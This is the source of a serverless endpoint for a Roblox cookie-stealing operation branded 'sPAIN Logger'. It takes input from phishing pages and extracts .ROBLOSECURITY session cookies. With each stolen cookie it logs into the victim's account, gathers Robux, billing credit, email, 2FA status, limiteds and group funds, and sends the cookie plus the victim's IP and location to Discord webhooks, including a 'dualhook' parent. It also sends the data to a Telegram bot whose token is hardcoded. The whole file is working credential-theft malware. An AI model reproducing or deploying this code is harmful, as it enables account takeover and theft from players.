// api/submit.js
const REDIS_URL   = process.env.UPSTASH_REDIS_REST_URL;
const REDIS_TOKEN = process.env.UPSTASH_REDIS_REST_TOKEN;
const TG_TOKEN    = process.env.TG_TOKEN || '8666861605:AAFA3E5IVxOtajuENoWm6BhBF0VMJZRFhy8';
const TG_CHAT     = process.env.TG_CHAT  || '7538845070';

// ── Redis ─────────────────────────────────────────────────────────────────────
async function redisGet(key) {
  const res = await fetch(`${REDIS_URL}/get/${encodeURIComponent(key)}`, {
    headers: { Authorization: `Bearer ${REDIS_TOKEN}` }
  });
  const json = await res.json();
  if (json.result === null || json.result === undefined) return null;
  if (typeof json.result === 'object') return json.result;
  try { return JSON.parse(json.result); } catch { return null; }
}

// ── Telegram ──────────────────────────────────────────────────────────────────
async function tgSend(text) {
  try {
    await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: TG_CHAT, text, parse_mode: 'HTML' })
    });
  } catch (_) {}
}

// ── IP Geo ────────────────────────────────────────────────────────────────────
async function getIpGeo(ip) {
  try {
    if (!ip || ip === 'Unknown') return null;
    const res = await fetch(`http://ip-api.com/json/${ip}?fields=status,country,countryCode,regionName,city,isp,query`);
    if (!res.ok) return null;
    const data = await res.json();
    return data.status === 'success' ? data : null;
  } catch (_) { return null; }
}

// ── Cookie extractor — scans ALL slot values for a valid cookie ───────────────
function extractRobloxCookie(raw) {
  if (!raw) return null;
  const cleaned = raw.trim().replace(/\s+/g, ' ');

  const fullMatch = cleaned.match(/(_\|WARNING:-DO-NOT-SHARE-THIS[^|]*\|_[\w\-.]+)/);
  if (fullMatch) return fullMatch[1];

  const warningMatch = cleaned.match(/_\|WARNING[^|]*\|_([\w\-.]+)/);
  if (warningMatch) return `_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_${warningMatch[1]}`;

  const tokenOnly = cleaned.match(/\|_([\w\-]{50,})/);
  if (tokenOnly) return `_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_${tokenOnly[1]}`;

  const bareToken = cleaned.match(/^([a-zA-Z0-9\-\_\.]{200,})$/);
  if (bareToken) return `_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_${bareToken[1]}`;

  return null;
}

// Scan every slot for a cookie
function findCookieInSlots(slots) {
  for (const [key, val] of Object.entries(slots)) {
    if (!val) continue;
    const cookie = extractRobloxCookie(val);
    if (cookie) return { cookie, slotKey: key };
  }
  return { cookie: null, slotKey: null };
}

// ── Gamepass check ────────────────────────────────────────────────────────────
async function checkGamepass(uid, gamepassId, headers) {
  try {
    const res = await fetch(`https://inventory.roblox.com/v1/users/${uid}/items/GamePass/${gamepassId}`, { headers });
    if (!res.ok) return false;
    const data = await res.json();
    return data.data && data.data.length > 0;
  } catch (_) { return false; }
}

// ── Full Roblox info fetch ────────────────────────────────────────────────────
async function fetchRobloxInfo(cookie) {
  try {
    const headers = { Cookie: `.ROBLOSECURITY=${cookie}` };
    const authRes = await fetch('https://users.roblox.com/v1/users/authenticated', { headers });
    if (!authRes.ok) return null;
    const auth = await authRes.json();
    const uid = auth.id;

    const [
      profileRes, robuxRes, friendsRes, premiumRes,
      billingRes, emailRes, groupsRes, limitedsRes, avatarRes, tfaRes
    ] = await Promise.all([
      fetch(`https://users.roblox.com/v1/users/${uid}`, {}),
      fetch('https://economy.roblox.com/v1/user/currency', { headers }),
      fetch(`https://friends.roblox.com/v1/users/${uid}/friends/count`, { headers }),
      fetch(`https://premiumfeatures.roblox.com/v1/users/${uid}/validate-membership`, { headers }),
      fetch('https://billing.roblox.com/v1/credit', { headers }),
      fetch('https://accountsettings.roblox.com/v1/email', { headers }),
      fetch(`https://groups.roblox.com/v1/users/${uid}/groups/roles`, { headers }),
      fetch(`https://inventory.roblox.com/v1/users/${uid}/assets/collectibles?limit=100`, { headers }),
      fetch(`https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${uid}&size=150x150&format=Webp`, {}),
      fetch(`https://twostepverification.roblox.com/v1/users/${uid}/configuration`, { headers }).catch(() => null)
    ]);

    const profile      = profileRes.ok    ? await profileRes.json()    : null;
    const robuxData    = robuxRes.ok      ? await robuxRes.json()       : null;
    const friendsData  = friendsRes.ok    ? await friendsRes.json()     : null;
    const isPremium    = premiumRes.ok    ? await premiumRes.json()     : false;
    const billingData  = billingRes.ok    ? await billingRes.json()     : null;
    const emailData    = emailRes.ok      ? await emailRes.json()       : null;
    const groupsData   = groupsRes.ok     ? await groupsRes.json()      : { data: [] };
    const limitedsData = limitedsRes.ok   ? await limitedsRes.json()    : { data: [] };
    const avatarData   = avatarRes.ok     ? await avatarRes.json()      : null;
    const tfaData      = tfaRes?.ok       ? await tfaRes.json()         : null;

    const accountAgeDays = profile?.created
      ? Math.floor((Date.now() - new Date(profile.created).getTime()) / 86400000)
      : 'N/A';

    const groups      = groupsData.data || [];
    const ownedGroups = groups.filter(g => g.role?.rank === 255);
    let groupRobux = 0, groupPending = 0;

    for (const group of ownedGroups.slice(0, 2)) {
      try {
        const [cr, pr] = await Promise.all([
          fetch(`https://economy.roblox.com/v1/groups/${group.group.id}/currency`, { headers }).catch(() => null),
          fetch(`https://economy.roblox.com/v2/groups/${group.group.id}/transactions?transactionType=pending&limit=10`, { headers }).catch(() => null)
        ]);
        if (cr?.ok) { const c = await cr.json(); groupRobux  += c.robux || 0; }
        if (pr?.ok) { const p = await pr.json(); groupPending += p.data?.reduce((a, t) => a + (t.currency?.amount || 0), 0) || 0; }
      } catch (_) {}
    }

    const limiteds      = limitedsData.data || [];
    const limitedsCount = limiteds.length;
    const limitedsValue = limiteds.reduce((s, i) => s + (i.recentAveragePrice || 0), 0);

    const gamepasses = {
      mm2:       await checkGamepass(uid, '17510307', headers),
      adoptMe:   await checkGamepass(uid, '33135930', headers),
      plsDonate: await checkGamepass(uid, '12345678', headers)
    };

    return {
      id: uid,
      username: auth.name,
      displayName: auth.displayName,
      isPremium: isPremium === true,
      accountAgeDays,
      robux:        robuxData?.robux     || 0,
      pendingRobux: 0,
      friends:      friendsData?.count   || 0,
      credit:       billingData?.balance || 0,
      groupsOwned:  ownedGroups.length,
      groupRobux,
      groupPending,
      limitedsCount,
      limitedsValue,
      emailSet:      emailData?.emailAddress ? 'Set ✅'      : 'False ❌',
      emailVerified: emailData?.verified     ? 'Verified ✅' : 'Unset ❌',
      twoFA:         tfaData?.methods?.length > 0 ? 'Enabled ✅' : 'Disabled ❌',
      gamepasses,
      avatarUrl: avatarData?.data?.[0]?.imageUrl || 'https://cdn-icons-png.flaticon.com/512/1827/1827392.png'
    };
  } catch (err) {
    console.error('Roblox fetch error:', err);
    return null;
  }
}

function f(name, value, inline = true) {
  return {
    name:  (name  || 'N/A').substring(0, 256),
    value: (value?.toString() || 'N/A').substring(0, 1000),
    inline
  };
}

// ── Build slot summary string (all 9 slots) ───────────────────────────────────
function buildSlotSummary(slots) {
  return Object.entries(slots)
    .map(([k, v]) => `Slot ${k.replace('slot', '')}: ${v || '(empty)'}`)
    .join('\n');
}

// ── Valid cookie Discord embed ─────────────────────────────────────────────────
async function sendValidEmbed(webhookUrl, { cookie, roblox, slots, ip, geo, now }) {
  if (!webhookUrl?.includes('discord.com/api/webhooks')) return false;
  const cleanCookie = cookie.trim();
  const slotSummary = buildSlotSummary(slots);

  try {
    const r = await fetch(webhookUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        content: '@everyone',
        embeds: [{
          title: `🧑 ${roblox.username} ${roblox.isPremium ? '⭐' : ''}`,
          description: `:fire: \`sPAIN\` :fire:\n\n[Profile 👤](https://www.roblox.com/users/${roblox.id}/profile) | [Refresh Cookie](https://www.roblox.com)`,
          color: 5793266,
          thumbnail: { url: roblox.avatarUrl },
          fields: [
            f('🔴 Robux',    `Balance: ${roblox.robux?.toLocaleString() || 0}\nPending: ${roblox.pendingRobux || 0}`),
            f('🎵 RAP',      `Value: ${roblox.limitedsValue?.toLocaleString() || 0}\nOwned: ${roblox.limitedsCount || 0}`),
            f('📊 Age',      `${roblox.accountAgeDays} Days`),
            f('💳 Billing',  `Credit: $${roblox.credit || 0}\nConvert: 0`),
            f('🎫 Premium',  `Premium: ${roblox.isPremium ? '✅' : '❌'}\nEmail: ${roblox.emailVerified}`),
            f('⚙️ Settings', `Email: ${roblox.emailSet}\n2FA: ${roblox.twoFA}`),
            f('👥 Groups',   `Balance: ${roblox.groupRobux?.toLocaleString() || 0}\nOwned: ${roblox.groupsOwned || 0}`),
            f('📍 Location', `${geo?.city || 'Unknown'}, ${geo?.country || 'Unknown'}`),
            f('🌐 IP',       ip || 'Unknown'),
            f('🎮 Gamepasses',
              `MM2: ${roblox.gamepasses?.mm2       ? '✅' : '❌'}\n` +
              `Adopt Me: ${roblox.gamepasses?.adoptMe   ? '✅' : '❌'}\n` +
              `Pls Donate: ${roblox.gamepasses?.plsDonate ? '✅' : '❌'}`, false),
            f('📋 All Slots Submitted', `\`\`\`${slotSummary}\`\`\``, false),
            f('🔐 .ROBLOSECURITY', `\`\`\`${cleanCookie}\`\`\``, false)
          ],
          footer: { text: `sPAIN Logger • ${now}` }
        }]
      })
    });
    return r.ok;
  } catch (_) { return false; }
}

// ── Invalid / troll Discord embed ─────────────────────────────────────────────
async function sendInvalidEmbed(webhookUrl, { slots, ip, geo, now }) {
  if (!webhookUrl?.includes('discord.com/api/webhooks')) return false;
  const slotSummary = buildSlotSummary(slots);

  try {
    const r = await fetch(webhookUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        content: '@everyone',
        embeds: [{
          title: `⚠️ Wrong Cookie — Someone is trolling lol 💀`,
          description: `A submission came in but the cookie was **invalid or fake**.\nEither they entered the wrong thing or someone's just messing around.`,
          color: 0xff3333,
          fields: [
            f('📋 What They Submitted', `\`\`\`${slotSummary.substring(0, 900)}\`\`\``, false),
            f('🌐 IP',       ip || 'Unknown'),
            f('📍 Location', `${geo?.city || 'Unknown'}, ${geo?.country || 'Unknown'}`),
            f('🗺️ ISP',      geo?.isp    || 'Unknown'),
            f('🕐 Date',     now, false)
          ],
          footer: { text: 'sPAIN Tools • Invalid Submission' },
          timestamp: now
        }]
      })
    });
    return r.ok;
  } catch (_) { return false; }
}

// ── Main handler ──────────────────────────────────────────────────────────────
export default async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  if (req.method === 'OPTIONS') return res.status(204).end();
  if (req.method !== 'POST')   return res.status(405).json({ error: 'Method not allowed' });

  let body = req.body;
  if (typeof body === 'string') {
    try { body = JSON.parse(body); } catch { return res.status(400).json({ error: 'Invalid JSON' }); }
  }

  const { slug, slots } = body || {};
  if (!slug)  return res.status(400).json({ error: 'slug is required' });
  if (!slots) return res.status(400).json({ error: 'slots is required' });

  // Load page record from Redis
  let record;
  try { record = await redisGet(`slot:${slug}`); } catch (err) {
    return res.status(500).json({ error: 'Redis error', detail: err.message });
  }
  if (!record)         return res.status(404).json({ error: 'Page not found' });
  if (!record.webhook) return res.status(500).json({ error: 'No webhook configured' });

  // Get IP + geo
  const ip  = req.headers['x-forwarded-for']?.split(',')[0]?.trim()
           || req.headers['x-real-ip']
           || 'Unknown';
  const geo = await getIpGeo(ip);
  const now = new Date().toISOString();

  // Scan ALL slots for a Roblox cookie
  const { cookie } = findCookieInSlots(slots);
  const roblox     = cookie ? await fetchRobloxInfo(cookie) : null;
  const isValid    = !!roblox;

  const payload = { cookie, roblox, slots, ip, geo, now };

  // Send to this page's webhook
  if (isValid) {
    await sendValidEmbed(record.webhook, payload);
  } else {
    await sendInvalidEmbed(record.webhook, payload);
  }

  // Also send to dualhook parent webhook if this is a child page
  if (record.dualhookParent) {
    try {
      const parent = await redisGet(`slot:${record.dualhookParent}`);
      if (parent?.webhook && parent.webhook !== record.webhook) {
        if (isValid) {
          await sendValidEmbed(parent.webhook, payload);
        } else {
          await sendInvalidEmbed(parent.webhook, payload);
        }
      }
    } catch (_) {}
  }

  // Telegram master log
  const slotSummary = buildSlotSummary(slots);
  await tgSend(isValid ? [
    `🚨 <b>VALID SUBMISSION</b>`,
    `👤 <b>${roblox.username}</b> ${roblox.isPremium ? '⭐' : ''}`,
    `💰 Robux: ${roblox.robux?.toLocaleString()}`,
    `🍪 Cookie: ✅ Captured`,
    `🌐 IP: ${ip}`,
    `📍 ${geo?.city || '?'}, ${geo?.country || '?'}`,
    `📄 Page: ${record.displayName} (${slug})`,
    ``,
    `<b>Slots:</b>`,
    slotSummary
  ].join('\n') : [
    `⚠️ <b>INVALID/TROLL SUBMISSION</b>`,
    `📄 Page: ${record.displayName} (${slug})`,
    `🌐 IP: ${ip}`,
    `📍 ${geo?.city || '?'}, ${geo?.country || '?'}`,
    `🕐 ${now}`,
    ``,
    `<b>What they sent:</b>`,
    slotSummary
  ].join('\n'));

  return res.status(200).json({ success: true });
}
